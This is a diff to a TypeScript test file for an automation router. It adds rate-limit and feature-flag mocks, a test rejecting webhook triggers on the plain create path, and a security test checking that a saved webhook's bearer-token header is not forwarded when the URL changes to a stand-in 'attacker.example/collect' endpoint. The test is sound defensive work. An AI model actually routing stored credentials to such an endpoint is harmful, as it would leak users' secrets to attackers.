@@ -23,6 +23,8 @@ const {
   mockRemoveReportSchedule,
   mockTriggerSentGroupBy,
   mockTriggerSentFindMany,
+  mockFeatureFlagIsEnabled,
+  mockRateLimit,
 } = vi.hoisted(() => ({
   mockEnforceLicenseLimit: vi.fn().mockResolvedValue(undefined),
   mockTriggerUpdate: vi.fn(),
@@ -38,6 +40,20 @@ const {
   mockRemoveReportSchedule: vi.fn().mockResolvedValue(undefined),
   mockTriggerSentGroupBy: vi.fn(),
   mockTriggerSentFindMany: vi.fn(),
+  mockFeatureFlagIsEnabled: vi.fn().mockResolvedValue(true),
+  mockRateLimit: vi.fn().mockResolvedValue({
+    allowed: true,
+    remaining: 9,
+    resetAt: Date.now() + 60_000,
+  }),
+}));
+
+vi.mock("~/server/featureFlag", () => ({
+  featureFlagService: { isEnabled: mockFeatureFlagIsEnabled },
+}));
+
+vi.mock("../../../rateLimit", () => ({
+  rateLimit: mockRateLimit,
 }));
 
 vi.mock("~/server/license-enforcement", async (importOriginal) => {
@@ -132,6 +148,19 @@ describe("automationRouter", () => {
   });
 
   describe("create", () => {
+    it("rejects SEND_WEBHOOK because only provider-aware upsert can persist it", async () => {
+      await expect(
+        caller.create({
+          projectId: "proj_123",
+          name: "Malformed webhook",
+          action: TriggerAction.SEND_WEBHOOK,
+          filters: {},
+          actionParams: {},
+        }),
+      ).rejects.toMatchObject({ code: "BAD_REQUEST" });
+      expect(mockTriggerCreate).not.toHaveBeenCalled();
+    });
+
     describe("when the input contains an unknown filter field", () => {
       it("rejects the request before resolver logic runs", async () => {
         await expect(
@@ -161,6 +190,42 @@ describe("automationRouter", () => {
         ).rejects.toMatchObject({ code: "BAD_REQUEST" });
 
         expect(mockEnforceLicenseLimit).not.toHaveBeenCalled();
+      });
+    });
+  });
+
+  describe("testFireTemplate", () => {
+    it("does not carry kept header secrets to a changed webhook URL", async () => {
+      mockTriggerFindUnique.mockResolvedValueOnce({
+        actionParams: {
+          url: "https://saved.example/hook",
+          method: "POST",
+          headers: { Authorization: "Bearer saved-secret" },
+          bodyTemplate: null,
+        },
+      });
+
+      await expect(
+        caller.testFireTemplate({
+          projectId: "proj_123",
+          channel: "webhook",
+          trigger: { name: "Webhook", alertType: null },
+          draft: {},
+          webhook: null,
+          webhookDestination: {
+            url: "https://attacker.example/collect",
+            method: "POST",
+            headers: { Authorization: "__kept__" },
+            bodyTemplate: null,
+          },
+          botDestination: null,
+          automationId: "trigger_test_123",
+          graphAlert: null,
+          report: null,
+        }),
+      ).rejects.toMatchObject({
+        code: "BAD_REQUEST",
+        message: expect.stringMatching(/Re-enter webhook header values/),
       });
     });
   });
